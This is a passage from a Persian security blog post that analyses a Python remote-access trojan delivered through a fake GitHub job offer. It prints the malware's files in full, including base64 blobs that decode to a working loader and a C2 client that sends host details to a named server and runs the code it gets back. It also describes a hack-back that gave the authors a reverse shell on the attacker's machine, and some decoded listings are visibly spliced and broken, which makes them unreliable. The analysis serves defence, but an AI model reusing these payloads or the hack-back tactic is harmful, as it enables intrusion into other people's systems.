---
title: عملیات معکوس شکارچیِ شکار شده
description: در این مطلب، ماجرای یک حمله با پیشنهاد کار جعلی را تعریف می‌کنیم که در یک سناریوی «شکارچیِ شکار شده»، به تحلیل بدافزار مهاجم و هک شدن خود او ختم شد.
slug: عملیات معکوس شکارچیِ شکار شده
date: 2025-08-15 03:02:00+0000
image: cover.png
categories:
    - Security
tags:
    - Threat_Hunting
weight: 1
---

<div dir="rtl">

می‌خوام درباره‌ی یه الگوی حمله حرف بزنم که این روزها واقعا مد شده؛ به خصوص علیه شرکت‌ها و برنامه‌نویس‌های کشورهایی مثل ایران. به خاطر تحریم‌ها و افت ارزش پول ملی، خیلی‌ها دنبال کار ریموت و حقوق دلاری ان؛ همین باعث میشه بعضی‌ها جوگیر شن و بیفتن تو دام اتکرهایی که نقش «کارفرمای خارجی» رو بازی می‌کنن: «پروژه کوچیکه، پول خوب می‌دیم، فقط یه پروژه/اسکریپت ساده…» و دقیقاً همون «ساده» تله ست.

ما مطلع هستیم که کارمندهای شرکت‌های بزرگ داخلی هم اخیراً قربانی این روش شدن. اخیرا یه نمونه برای ما رخ داد که به یه سناریوی «شکارچیِ شکار شده» تبدیل شد. یکی از همکارهامون با یه پیشنهاد کار جعلی توی گیت‌هاب مواجه شد که پروژه حاوی یه RAT پایتونی بود؛ اما به جای افتادن توی دام مهاجم، بدافزارش رو تحلیل کردیم و مهاجم رو فریب دادیم تا یه ایمیج تله‌گذاری شده رو اجرا کنه. این کار به ما یه reverse shell روی سیستم اون داد.

در ادامه، داستان کامل این ماجرا رو شرح می‌دم؛ از جمله حرکت بعدی اون، یعنی تلاش ناموفق برای فیشینگ با استفاده از یه لینک جعلی گوگل میت.

## **شروع ماجرا**

یکی از همکارام، توی گیت‌هاب پیامی از یه فرد ناشناس دریافت کرد. متن پیام دقیقا این بود:

<div dir="ltr">

> I’m currently working on a startup project, and I’ll be sending you a detailed document about it as soon as quickly within this week so you can understand the overall plan and requirements.
>
> In the meantime, I have a small Python-based analysis tool that’s part of our development process. Would it be possible for you to create a Docker build for this tool and provide the resulting image? Also, could you let me know roughly how long such a task might take and what budget I should prepare for it?
> 
> We expect to have quite a number of similar small projects in the future, so knowing the estimate for this one will help me plan the total budget for all upcoming work.


</div>
آدرس گیتهاب این فرد مشکوک:

<dir dir="ltr">

[https://github.com/HarryKingWork](https://github.com/HarryKingWork)

</div>


![پروفایل مهاجم در گیتهاب](harry1.png)

پروفایل مهاجم در گیت‌هاب

خب این پیام خیلی بودار بود و واضح بود که کلاهبرداریه. آخه کی میاد یهو توی گیت‌هاب پیام بده که بیا من پروژه دارم! خوشبختانه همکارم تجربه کافی رو داشت و سریع متوجه شد این داستان بوی خطر میده. هیچ همکاری باهاش نکرد و اون فرد رو هم بلاک کرد. بعدش ماجرا رو به من منتقل کرد تا بیشتر بررسی کنم.

## **بررسی اولیه**

اول مطمئن شدم که فرد دیگری توی شرکت با اون در تماس نبوده و موضوع بیشتر شخصیه تا سازمانی. اما از سر کنجکاوی، تصمیم گرفتم یکمی بیشتر جلو برم. به آیدی تلگرام مهاجم که از همکارم گرفته بودم پیام دادم:  
«خب چی شد؟ قرار بود پروژه بدی، من منتظرم!»

طرف گیج شده بود، یادش نمیومد قبلا با من صحبت کرده، ولی کم‌کم جا افتاد و دوباره شروع کرد از پروژه DevOps گفتن. منم خودمو مشتاق نشون دادم که فقط می خوام سریع کار رو بگیرم.

![](harry2.png)

بعدش برام یه فایل زیپ رمزدار "chartflow\_analysis\_deploy.zip" فرستاد. 

![](harry3.png)

سریع فایل رو بردم توی sandbox بازش کردم و شروع کردم به بررسی کردن.

```bash
-> % ls -R
.:
Dockerfile  data  main.py  requirements.txt  src

./data:
Price100.txt  Price102.txt  Price104.txt  Price106.txt
Price101.txt  Price103.txt  Price105.txt

./src:
__pycache__   csvutils.py       risk_csv.py        test_risk.py
calc_data.py  requirements.txt  test_data_calc.py

./src/__pycache__:
calc_data.cpython-39.pyc  risk_calculation.cpython-39.pyc
csvutils.cpython-39.pyc   risk_csv.cpython-39.pyc
```

اینجور وقت ها اولین چیزی که دنبالش می گردم یه پیلود رمز شده یا مثلا base64 انکود شده هست. خیلی زود سرنخ  اولیه توی مسیر  
**chartflow\_analysis/src/risk-csv.py/.**
 پیدا شد که مشخصا رفتار یه بدافزار رو داشت.

## **تحلیل اسکریپت مخرب**

خب بریم سراغ تحلیل. اول یه نگاه به کد risk\_csv.py بندازیم:

```python
import time
import ctypes
import ctypes as ct
import base64
import os.path
import subprocess
import platform
import threading
import subprocess
from ctypes import wintypes as w
from sys import platform
import os
import sys

rdata2 = "ZGVmIGV4dF9yZXNvdXJjZShmaWxlLCBzaG93KToKICAgIHB5dGhvbl9wYXRoID0gc3lzLmJhc2VfZXhlY19wcmVmaXggKyAiXFxweXRob253LmV4ZSIKICAgIHNoZWxsMzIgPSBjdC5XaW5ETEwoJ3NoZWxsMzInKQogICAgc2hlbGwzMi5TaGVsbEV4ZWN1dGVBLmFyZ3R5cGVzID0gdy5IV05ELCB3LkxQQ1NUUiwgdy5MUENTVFIsIHcuTFBDU1RSLCB3LkxQQ1NUUiwgdy5JTlQKICAgIHNoZWxsMzIuU2hlbGxFeGVjdXRlQS5yZXN0eXBlID0gdy5ISU5TVEFOQ0UKICAgIGlmKG9zLnBhdGguZXhpc3RzKHB5dGhvbl9wYXRoKT09VHJ1ZSk6CiAgICAJc2hlbGwzMi5TaGVsbEV4ZWN1dGVBKE5vbmUsIGInb3BlbicsIHB5dGhvbl9wYXRoLmVuY29kZSgpLGZpbGUsIE5vbmUsIHNob3cpCiAgICBlbHNlOgogICAgICAgIHNoZWxsMzIuU2hlbGxFeGVjdXRlQShOb25lLCBiJ29wZW4nLCBiJ3B5LmV4ZScsZmlsZSwgTm9uZSwgc2hvdykKCmRlZiBydW5fY29tbWFuZChjb21tYW5kKToKICAgIG91dHB1dCA9ICIiCiAgICBlcnJvciA9ICIiCiAgICB3aXRoIG9zLnBvcGVuKGNvbW1hbmQpIGFzIHByb2Nlc3M6CiAgICAgICAgb3V0cHV0ID0gcHJvY2Vzcy5yZWFkKCkKICAgICAgICByZXR1cm5fY29kZSA9IHByb2Nlc3MuY2xvc2UoKQogICAgaWYgcmV0dXJuX2NvZGUgaXMgbm90IE5vbmUgYW5kIHJldHVybl9jb2RlICE9IDA6CiAgICAgICAgd2l0aCBvcy5wb3Blbihjb21tYW5kICsgIiAyPiYxIikgYXMgcHJvY2VzczoKICAgICAgICAgICAgZXJyb3IgPSBwcm9jZXNzLnJlYWQoKQogICAgZWxzZToKICAgICAgICBlcnJvciA9ICIiCiAgICByZXR1cm4KCmlmIHBsYXRmb3JtID09ICJ3aW4zMiI6CiAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXykgKyJcXHRlc3Rfcmlzay5weSIKICAgIHNjcmlwdF9wYXRoID0gJyInICsgc2NyaXB0X3BhdGggKyAnIicKICAgIGV4dF9yZXNvdXJjZShzY3JpcHRfcGF0aC5lbmNvZGUoKSwgMCkKZWxzZToKICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGgucmVhbHBhdGgoX19maWxlX18pKQogICAgc2NyaXB0X3BhdGggPSAicHl0aG9uMyAiICsgJyInICsgc2NyaXB0X3BhdGggKyAiL3Rlc3Rfcmlzay5weSIgKyAnIicgKyAiID4gL2Rldi9udWxsIDI+JjEgJiIKICAgIHJ1bl9jb21tYW5kKHNjcmlwdF9wYXRoKQ=="
def test_read(self):
	csv_data = csv.read("../data/Price101.txt", 0, 4)
	self.assertEquals(473, len(csv_data))
	first_price = csv_data[0][1]
	last_price = csv_data[472][1]
	self.assertEquals(58.209999, first_price)
	self.assertEquals(66.510002, last_price)

def jestinc():
	dalc = "YzpcdXNlcnNccHVibGljXEljb25DYWNoZS5kYXQ="
	ddapl = base64.b64decode(dalc)
	jww = open(ddapl, "w")
	jww.write("aHR0cDovL25ldHVwZGF0ZXMuaW5mby9ib2FyZC9ib2FyZC5waHA=")
	jww.close()
def hasattrenc():
	vwplat = base64.b64decode(rdata2)
	exec(vwplat)

def env_reset():
	if platform == "win32":
		jestinc()
	th_init = threading.Thread(target=hasattrenc, args=())
	th_init.start()
def test_get_historical_prices(self):
	historical_prices = csv.read_all_files("../data", 0, 4)
	self.assertEquals(22, len(historical_prices))
	for key, value in historical_prices.items():
		self.assertEquals(473, len(value))
```

تابع env_reset در صورت ویندوز بودن اول jestinc رو صدا میزنه که فایلی به اسم C:**\\Users\\Public\\IconCache.dat** می‌سازه و داخلش رشته ی انکد شده‌ی http://netupdates[.]info/board/board.php رو ذخیره می‌کنه. بعد با یک ترد پس زمینه hasattrenc دیتای موجود توی rdata2 رو دیکد و اجرا می‌کنه. 

خود تابع env_reset هم از داخل فایل main.py داره فراخونی میشه به این صورت:

```python
import pandas as pd
import os
from src.risk_csv import env_reset
import src.calc_data as risk_calc
from src import csvutils as csv
import matplotlib.pyplot as plt

... 

def main():
    working_directory = os.path.dirname(os.path.realpath(__file__)) + "\data"
    env_reset()
    ...

if __name__ == '__main__':
    main()
```

خب rdata2 رو باید دیکود کنیم و ببینیم چه خبره:

```python
-> % echo -n "ZGVmIGV4dF9yZXNvdXJjZShm…wYXRoKQ==" | base64 -d

def ext_resource(file, show):
    python_path = sys.base_exec_prefix + "\\pythonw.exe"
    shell32 = ct.WinDLL('shell32')
    shell32.ShellExecuteA.argtypes = w.HWND, w.LPCSTR, w.LPCSTR, w.LPCSTR, w.LPCSTR, w.INT
    shell32.ShellExecuteA.restype = w.HINSTANCE
    if(os.path.exists(python_path)==True):
        shell32.ShellExecuteA(None, b'open', python_path.encode(),file, None, show)
    else:
        shell32.ShellExecuteA(None, b'open', b'py.exe',file, None, show)

def run_command(command):
    output = ""
    error = ""
    with os.popen(command) as process:
        output = process.read()
        return_code = process.close()
    if return_code is not None and return_code != 0:
        with os.popen(command + " 2>&1") as process:
            error = process.read()
    else:
        error = ""
    return

if platform == "win32":
    script_path = os.path.dirname(__file__) +"\\test_risk.py"
    script_path = '"' + script_path + '"'
    ext_resource(script_path.encode(), 0)

else:
    script_path = os.path.dirname(os.path.realpath(__file__))
    script_path = "python3 " + '"' + script_path + "/test_risk.py" + '"' + " > /dev/null 2>&1 &"
    run_command(script_path)
```

خب داره مشخص می‌شه که چه خبره. فایل risk_csv.py یک لانچر که وظیفه‌اش بالا آوردن بدافزار اصلی (test_risk.py) هست. رشته‌ی پلتفرم رو میگیره تا تشخیص بده سیستم‌عامل کاربر چیه. روی ویندوز از طریق ctypes و shell32.ShellExecuteA، اسکریپت اصلی رو با pythonw.exe و بدون پنجره‌ی کنسول مخیفانه اجرا می‌کنه؛ 
روی غیر ویندوز همون فایل رو توی بک‌گراند با دستور زیر 

```bash
‍python3 "dir/test_risk.py" > /dev/null 2>&1 &
```

 اجرا میکنه تا همه‌ی ورودی/خروجی‌ها صامت بشن. 

حالا بریم سراغ فایل test_risk.py و داخلش  رو بررسی کنیم:

```python
import sys
import os
import string
import urllib.request
import urllib.error
import http.client
import json
import struct
import time
import array
import socket
import ctypes
import ctypes as ct
import os.path
import subprocess
import platform
from ctypes import wintypes as w
from pathlib import Path
import base64
import threading
import random
import ssl

error_de = "YUtPID0gImFkZndlZndlZndlIg0KdXJsID0gImh0dHBzOi8vc2VhcmNoYm94LmluZm8vcHJlZmVyLnBocCINCg0K"

din_dat = "dHJhY2UgPSAiaWlubmlvb2lvam5uYXdlZm9pam9udmJ6MWF6eHNkd3dhYXF6dncyMzRld3hjdm5vcHJ0d3F4diINCktleSA9IGJ5dGVhcnJheShbMywgNiwgMiwgMSwgNiwgMCwgNCwgNywgMCwgMSwgOSwgNiwgOCwgMSwgMiwgNV0pDQpkZWYgR2V0T2JqSUQoKToNCiAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5hc2NpaV9sZXR0ZXJzKSBmb3IgeCBpbiByYW5nZSgxMikpDQpkZWYgR2V0T1NTdHJpbmcoKToNCiAgICByZXR1cm4gcGxhdGZvcm0ucGxhdGZvcm0oKQ0Kc3pPYmplY3RJRCA9IEdldE9iaklEKCkNCnN6UENvZGUgPSAiT3BlcmF0aW5nIFN5c3RlbSA6ICIgKyBHZXRPU1N0cmluZygpDQpzekNvbXB1dGVyTmFtZSA9ICJDb21wdXRlciBOYW1lIDogIiArIHNvY2tldC5nZXRob3N0bmFtZSgpDQpkZWYgeG9yX2VuY3J5cHRfZGVjcnlwdChkYXRhLCBrZXkpOg0KICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpDQogICAgZm9yIGkgaW4gcmFuZ2UobGVuKGRhdGEpKToNCiAgICAgICAgcmVzdWx0LmFwcGVuZChkYXRhW2ldIF4ga2V5W2kgJSBsZW4oa2V5KV0pDQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkNCmRlZiBnZXRfYnl0ZXNfZnJvbV91bmljb2RlKHRleHQsIGVuY29kaW5nID0gJ3V0Zi0xNmxlJyk6DQogICAgcmV0dXJuIHRleHQuZW5jb2RlKGVuY29kaW5nKQ0KZGVmIEhUVFBfUE9TVCh1cmwsIGRhdGEpOg0KICAgIHVzZXJfYWdlbnQgPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2Ig0KICAgIGVuY29kZWRfZGF0YSA9IGRhdGEuZW5jb2RlKCd1dGYtOCcpDQogICAgY29udGV4dCA9IHNzbC5fY3JlYXRlX3VudmVyaWZpZWRfY29udGV4dCgpDQogICAgbl9yZXF1ZXN0ID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9ZW5jb2RlZF9kYXRhKQ0KICAgIG5fcmVxdWVzdC5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgdXNlcl9hZ2VudCkNCg0KICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihuX3JlcXVlc3QsIGNvbnRleHQ9Y29udGV4dCwgdGltZW91dCA9IDYwKSBhcyByZXNwb25zZToNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykNCmRlZiBNYWtlUmVxdWVzdFBhY2tldChzekNvbnRlbnRzKToNCiAgICBzekNJRCA9ICJGRDQyOURFQUJFIg0KICAgIHN6U3RlcCA9ICJcclxuXHRcdFN0ZXAxIDogS2VlcExpbmsoUClcclxuIg0KICAgIGxzelJlcXVlc3QgPSBiIiINCiAgICBscFJlcXVlc3QgPSBieXRlYXJyYXkoKQ0KICAgIGxwUmVxdWVzdEVuYyA9IGJ5dGVhcnJheSgpDQogICAgaWYgbGVuKHN6Q29udGVudHMpID09IDA6DQogICAgICAgIHN6RGF0YSA9IHN6U3RlcCArIHN6UENvZGUgKyAiXHJcbiIgKyBzekNvbXB1dGVyTmFtZSArICJcclxuIiArIHN6Q29udGVudHMNCiAgICBlbHNlOg0KICAgICAgICBzekRhdGEgPSBzekNvbnRlbnRzDQogICAgbHN6UmVxdWVzdCA9ICJpZD0iICsgc3pDSUQgKyAiJm9pZD0iICsgc3pPYmplY3RJRCArICImZGF0YT0iDQogICAgbHBSZXF1ZXN0ID0gZ2V0X2J5dGVzX2Zyb21fdW5pY29kZShzekRhdGEpDQogICAgbHBSZXF1ZXN0RW5jID0geG9yX2VuY3J5cHRfZGVjcnlwdChscFJlcXVlc3QsS2V5KQ0KICAgIHN6YjY0RGF0YSA9IGJhc2U2NC5iNjRlbmNvZGUobHBSZXF1ZXN0RW5jKS5kZWNvZGUoKQ0KICAgIGxzelJlcXVlc3QgKz0gc3piNjREYXRhDQogICAgcmV0dXJuIGxzelJlcXVlc3QNCmRlZiBlbmNyeXB0X2RlY3J5cHQoZGF0YTogYnl0ZXMsIGtleTogaW50KSAtPiBieXRlczoNCiAgICByZXN1bHQgPSBieXRlYXJyYXkoKQ0KICAgIGZvciBieXRlIGluIGRhdGE6DQogICAgICAgIGVuY3J5cHRlZF9ieXRlID0gYnl0ZSBeIGtleQ0KICAgICAgICByZXN1bHQuYXBwZW5kKGVuY3J5cHRlZF9ieXRlKQ0KICAgIHJldHVybiBieXRlcyhyZXN1bHQpDQpkZWYgYmxvY2tfY29weShzb3VyY2UsIHNvdXJjZV9vZmZzZXQsIGRlc3RpbmF0aW9uLCBkZXN0aW5hdGlvbl9vZmZzZXQsIGNvdW50KToNCiAgICBmb3IgaSBpbiByYW5nZShjb3VudCk6DQogICAgICAgIGRlc3RpbmF0aW9uW2Rlc3RpbmF0aW9uX29mZnNldCArIGldID0gc291cmNlW3NvdXJjZV9vZmZzZXQgKyBpXQ0Kc3pDb250ZW50cyA9ICIiDQp3aGlsZSBUcnVlOg0KICAgIGxwQ21kSUQgPSBieXRlYXJyYXkoNCkNCiAgICBscERhdGFMZW4gPSBieXRlYXJyYXkoNCkNCiAgICBuQ01ESUQgPSAwDQogICAgbkRhdGFMZW4gPSAwDQogICAgbkxlbiA9IDANCiAgICBzekNvZGUgPSAiIg0KICAgIHN6Q29kZUFyciA9IFsibmV3IHN0cmluZyJdDQogICAgc3pSZXF1ZXN0ID0gIiINCiAgICBzelJlc3BvbnNlID0gIiINCiAgICBscENvbnRlbnQgPSBieXRlYXJyYXkoKQ0KICAgIGxwRGF0YSA9IGJ5dGVhcnJheSgpDQogICAgbHBDb250ZW50RW5jID1ieXRlYXJyYXkoKQ0KICAgIHRyeToNCiAgICAgICAgc3pSZXF1ZXN0ID0gTWFrZVJlcXVlc3RQYWNrZXQoc3pDb250ZW50cykNCiAgICAgICAgc3pDb250ZW50cyA9ICIiDQogICAgICAgIHN6UmVzcG9uc2UgPSBIVFRQX1BPU1QodXJsLCBzelJlcXVlc3QpDQogICAgICAgIA0KICAgICAgICBzelJlc3BvbnNlID0gc3pSZXNwb25zZS5yZXBsYWNlKCcgJywgJysnKQ0KICAgICAgICBpZiBzelJlc3BvbnNlID09ICJTdWNjZWVkISI6DQogICAgICAgICAgICB0aW1lLnNsZWVwKDIwKQ0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbHBDb250ZW50RW5jID0gYmFzZTY0LmI2NGRlY29kZShzelJlc3BvbnNlKQ0KICAgICAgICBscENvbnRlbnQgPSB4b3JfZW5jcnlwdF9kZWNyeXB0KGxwQ29udGVudEVuYywgS2V5KQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgMCwgbHBDbWRJRCwgMCwgNCkNCiAgICAgICAgYmxvY2tfY29weShscENvbnRlbnQsIDQsIGxwRGF0YUxlbiwgMCwgNCkNCiAgICAgICAgbkNNRElEID0gc3RydWN0LnVucGFjaygnPGknLGxwQ21kSUQpWzBdDQogICAgICAgIG5EYXRhTGVuID0gc3RydWN0LnVucGFjaygnPGknLGxwRGF0YUxlbilbMF0NCiAgICAgICAgbHBEYXRhID0gYnl0ZWFycmF5KG5EYXRhTGVuKQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgOCwgbHBEYXRhLCAwLCBuRGF0YUxlbikNCiAgICAgICAgbHBEYXRhID0gZW5jcnlwdF9kZWNyeXB0KGxwRGF0YSwgMTIzKQ0KICAgICAgICBzekNvZGUgPSBscERhdGEuZGVjb2RlKCd1dGYtOCcpDQogICAgICAgIA0KICAgICAgICAjc3pDb2RlQXJyWzBdID0gc3pDb2RlDQogICAgICAgIGlmIG5DTURJRCA9PSAxMDAxOg0KICAgICAgICAgICAgZXhlYyhzekNvZGUpDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBpZiBuQ01ESUQgPT0gMTAwMjoNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNjApDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBjb250aW51ZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgY29udGludWUNCiAgICB0aW1lLnNsZWVwKDIwKQ0Ka2JlcHMgPSAid2VlZyI="

def test_get_regressions(self):
        prices = data.read_all_files("../data", 0, 4)
        risk_calculation = r.RiskCalculation(prices, 'Price103')
        self.assertEquals(22 - 1, len(risk_calculation.risk_params))

def test_get_weights(self):
    prices = data.read_all_files("../data", 0, 4)
    risk_calculation = r.RiskCalculation(prices, 'Price103')
    self.assertAlmostEqual(1, sum([val.weight for key, val in risk_calculation.risk_params.items()]))

sdat = base64.b64decode(error_de)
if(sdat==""):
    sdat = is_url_valid(sdat)

kerrs = sdat + base64.b64decode("Cg==")
if(din_dat == "Error"):
    kerrs = "Error"
if(din_dat == "valid"):
    kerrs += base64.b64decode("valid")
kerrs += base64.b64decode(din_dat)
if(kerrs == "none"):
    kerrs = extract_url_domain("valid")
szParentDir = Path(sys.argv[0])
szFileDirPath = szParentDir.parent
szFilePath = szFileDirPath.__str__() + "/requirements.txt"
with open(szFilePath, 'r') as file:
    sztext = file.read()
if len(sztext) != 0:
        exec(kerrs)
```

دوباره دوتا متغیر داریم که با base64 انکد شدن. متغیرهای **error_de** و **din_dat** رو دیکدشون کنیم ببینیم چه خبره:

اول میریم سراغ error_de:

```bash
$ echo -n "YUtPID0gImFkZndlZndlZndlIg0K\
dXJsID0gImh0dHBzOi8vc2VhcmNoYm94LmluZm8vcHJlZmVyLnBocCINCg0K" \
| base64 -d

aKO = "adfwefwefwe"
url = "https://searchbox.info/prefer.php"
```

خب به به آدرس C2 ش مشخص شد. و حالا din_dat:

```python
$ echo -n "\
dHJhY2UgPSAiaWlubmlvb2lvam5uYXdlZm9…\
LnNsZWVwKDIwKQ0K\
a2JlcHMgPSAid2VlZyI=" \
| base64 -d


trace = "iinniooiojnnawefoijonvbz1azxsdwwaaqzvw234ewxcvnoprtwqxv"
Key = bytearray([3, 6, 2, 1, 6, 0, 4, 7, 0, 1, 9, 6, 8, 1, 2, 5])
def GetObjID():
    return ''.join(random.choice(string.ascii_letters) for x in range(12))
def GetOSString():
    return platform.platform()
szObjectID = GetObjID()
szPCode = "Operating System : " + GetOSString()
szComputerName = "Computer Name : " + socket.gethostname()
def xor_encrypt_decrypt(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ key[i % len(key)])
    return bytes(result)
def get_bytes_from_unicode(text, encoding = 'utf-16le'):
    return text.encode(encoding)
def HTTP_POST(url, data):
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    encoded_data = data.encode('utf-8')
    context = ssl._create_unverified_context()
    n_request = urllib.request.Request(url, data=encoded_data)
    n_request.add_header('User-Agent', user_agent)

    with urllib.request.urlopen(n_request, context=context, timeout = 60) as response:
        return response.read().decode('utf-8')
def MakeRequestPacket(szContents):
    szCID = "FD429DEABE"
    szStep = "\r\n\t\tStep1 : KeepLink(P)\r\n"
    lszRequest = b""
    lpRequest = bytearray()
    lpRequestEnc = bytearray()
    if len(szContents) == 0:
        szData = szStep + szPCode + "\r\n" + szComputerName + "\r\n" + szContents
    else:
        szData = szContents
    lszRequest = "id=" + szCID + "&oid=" + szObjectID + "&data="
    lpRequest = get_bytes_from_unicode(szData)
    lpRequestEnc = xor_encrypt_decrypt(lpRequest,Key)
    szb64Data = base64.b64encode(lpRequestEnc).decode()
    lszRequest += szb64Data
    return lszRequest
def encrypt_decrypt( Key)
        block_copy(lpContent, 0, lpCmdID, 0, 4)
        block_copy(lpContent, 4, lpDataLen, 0, 4)
        nCMDID = struct.unpack('<i',lpCmdID)[0]
        nDataLen = struct.unpack('<i',lpDataLen)[0]
        lpData = bytearray(nDataLen)
        block_copy(lpContent, 8, lpData, 0, nDataLen)
        lpData = encrypt_decrypt(lpData, 123)
        szCode = lpData.decode('utf-8')

        #szCodeArr[0] = szCode
        if nCMDID == 1001:
            exec(szCode)
            continue
        if nCMDID == 1002:
            time.sleep(60)
            continue
        continue
    except Exception as e:
        continue
    time.sleep(20)
kbeps = "weeg"
```

از din_dat هم منطق اصلی RAT پیدا شد. بریم که توی چند تا بخش بررسیش کنیم.

### **ثابت ها و آماده سازی**

```python
trace = "iinniooiojnnawefoijonvbz1azxsdwwaaqzvw234ewxcvnoprtwqxv"
Key = bytearray([3, 6, 2, 1, 6, 0, 4, 7, 0, 1, 9, 6, 8, 1, 2, 5])
def GetObjID():
    return ''.join(random.choice(string.ascii_letters) for x in range(12))
def GetOSString():
    return platform.platform()
szObjectID = GetObjID()
szPCode = "Operating System : " + GetOSString()
szComputerName = "Computer Name : " + socket.gethostname()
```

ظاهرا رشته‌ی trace صرفا نقش تزئینی داره و در ادامه استفاده‌ی مؤثری ازش نمیشه. توی متغیر Key کلید ۱۶بایتی برای XOR و رمز کردن داده‌ها برای ارسال درخواست به C2 و رمزگشایی پاسخ دریافتی از C2 بکار میره. 

تابع GetObjID هر بار که فراخونی بشه یه شناسه‌ی ۱۲حرفی تصادفی می‌سازه که توی پارامتر oid درخواست‌ها میاد و نشست‌ها رو از  هم دیگه تفکیک می‌کنه. تابع GetOSString  اسم و مشخصات سیستم‌عامل رو برمی‌گردونه تا احتمالا بعدا توی تله‌متری استفاده بشه. مقدار szObjectID هم همون شناسه‌ی تصادفی و یکتای این چرخه‌ست.

### **توابع رمزنگاری و کمکی**

```python
def xor_encrypt_decrypt(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ key[i % len(key)])
    return bytes(result)

def get_bytes_from_unicode(text, encoding = 'utf-16le'):
    return text.encode(encoding)

def encrypt_decrypt( szRequest)
        szResponse = szResponse.replace(' ', '+')
        if szResponse == "Succeed!":
            time.sleep(20)
            continue
        lpContentEnc = base64.b64decode(szResponse)
        lpContent = xor_encrypt_decrypt(lpContentEnc, Key)
        block_copy(lpContent, 0, lpCmdID, 0, 4)
        block_copy(lpContent, 4, lpDataLen, 0, 4)
        nCMDID = struct.unpack('<i',lpCmdID)[0]
        nDataLen = struct.unpack('<i',lpDataLen)[0]
        lpData = bytearray(nDataLen)
        block_copy(lpContent, 8, lpData, 0, nDataLen)
        lpData = encrypt_decrypt(lpData, 123)
        szCode = lpData.decode('utf-8')

        #szCodeArr[0] = szCode
        if nCMDID == 1001:
            exec(szCode)
            continue
        if nCMDID == 1002:
            time.sleep(60)
            continue
        continue
    except Exception as e:
        continue
    time.sleep(20)

kbeps = "weeg"

```
تابع xor_encrypt_decrypt یک XOR با کلید ۱۶‌بایتی انجام می‌ده؛ این همون لایه‌ی بیرونی رمزگذاری/رمزگشایی هس. تابع get_bytes_from_unicode متن رو قبل از XOR به UTF-16LE تبدیل می‌کنه. تابع encrypt_decrypt یه عملیات XOR تک‌بایتی با کلید ثابت ۱۲۳ است و روی بدنه‌ی دستور در جواب C2 اعمال می‌شه، یعنی جواب‌ها دو لایه XOR دارند: بیرونی با کلید ۱۶‌بایتی، درونی با ۱۲۳. block_copy هم نقشش اینه که از بدنه‌ی پاسخ، داده‌ها رو (کد دستور، کامند، هدر و …) بر اساس آفست شون استخراج کنه.

### **لایه‌ی انتقال**

```python
def HTTP_POST(url, data):
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    encoded_data = data.encode('utf-8')
    context = ssl._create_unverified_context()
    n_request = urllib.request.Request(url, data=encoded_data)
    n_request.add_header('User-Agent', user_agent)
    with urllib.request.urlopen(n_request, context=context, timeout = 60) as response:
        return response.read().decode('utf-8')
```
 درخواست‌ها با urllib ارسال می‌شن. اعتبارسنجی TLS عمداً خاموش شده تا گواهی‌های نامعتبر(امضا نشده) با خطا مواجه نشه. User-Agent هم همیشه ثابته.

 ### **ساخت پکت برای ارتباط با c2**
 
 ```python
 def MakeRequestPacket(szContents):
    szCID = "FD429DEABE"
    szStep = "\r\n\t\tStep1 : KeepLink(P)\r\n"
    lszRequest = b""
    lpRequest = bytearray()
    lpRequestEnc = bytearray()
    if len(szContents) == 0:
        szData = szStep + szPCode + "\r\n" + szComputerName + "\r\n" + szContents
    else:
        szData = szContents
    lszRequest = "id=" + szCID + "&oid=" + szObjectID + "&data="
    lpRequest = get_bytes_from_unicode(szData)
    lpRequestEnc = xor_encrypt_decrypt(lpRequest,Key)
    szb64Data = base64.b64encode(lpRequestEnc).decode()
    lszRequest += szb64Data
    return lszRequest
 ```
 مقدار szCID احتمالا به عنوان شناسه‌ی کمپین استفاده می‌شه که همیشه ثابت و برابر با FD429DEABE و همراه با oid (شناسه‌ی ۱۲حرفی) و data ارسال می‌شه. وقتی szContents خالی باشه، اسکریپت برای heartbeet و یا معرفی اولیه‌ رشته‌ی Step1 : KeepLink(P) رو به‌ همراه اطلاعات سیستم (szPCode/szComputerName/) پر می‌کنه. این متن به UTF-16LE تبدیل می‌شه و با کلید ۱۶‌بایتی XOR میشه و درنهایت Base64 انکد می‌شه. 
خروجی نهایی بدنه‌ی POST هست به فرم زیر ایجاد میشه:


```
id=FD429DEABE&oid=<12char>&data=<Base64(XOR_16(UTF-16LE(payload)))>
```


### **حلقه‌ی فرماندهی و کنترل (C2 Loop)**
```python
szContents = ""
while True:
    lpCmdID = bytearray(4)
    lpDataLen = bytearray(4)
    nCMDID = 0
    nDataLen = 0
    nLen = 0
    szCode = ""
    szCodeArr = ["new string"]
    szRequest = ""
    szResponse = ""
    lpContent = bytearray()
    lpData = bytearray()
    lpContentEnc =bytearray()
    try:
        szRequest = MakeRequestPacket(szContents)
        szContents = ""
        szResponse = HTTP_POST(url, szRequest)
        szResponse = szResponse.replace(' ', '+')
